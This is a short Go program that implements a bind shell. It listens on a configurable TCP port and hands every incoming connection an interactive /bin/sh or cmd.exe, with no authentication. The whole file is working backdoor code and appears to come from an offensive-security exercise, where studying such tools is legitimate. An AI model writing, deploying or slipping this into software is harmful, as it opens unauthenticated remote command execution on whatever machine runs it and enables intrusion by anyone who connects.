package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
)

// FlushedWriter wraps bufio.Writer and explicity flushes on writes
type FlushedWriter struct {
	writer *bufio.Writer
}

// NewFlushedWriter creates a flushed writer from a writer instance
func NewFlushedWriter(writer io.Writer) *FlushedWriter {
	return &FlushedWriter{
		writer: bufio.NewWriter(writer),
	}
}

// Write writes bytes and explicitly flushes buffer.
func (foo *FlushedWriter) Write(b []byte) (int, error) {
	count, err := foo.writer.Write(b)
	if err != nil {
		return -1, err
	}
	if err := foo.writer.Flush(); err != nil {
		return -1, err
	}
	return count, err
}

func handle(conn net.Conn, target string) {
	cmd := exec.Command("foo") // Terrible placeholder
	// Create proper connection object based on target OS
	if strings.Compare("windows", target) == 0 {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh", "-i")
	}
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp

	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	var port = flag.Int("port", 1234, "Port to use for the bind shell")
	var target = flag.String("target", "linux", "Target OS - this determines /bin/sh or cmd.exe")
	flag.Parse()

	if *port == 0 || strings.Compare("", *target) == 0 {
		flag.PrintDefaults()
		os.Exit(1)
	}
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", *port))
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		conn.Write([]byte("Connected.\n"))
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn, *target)
	}
}
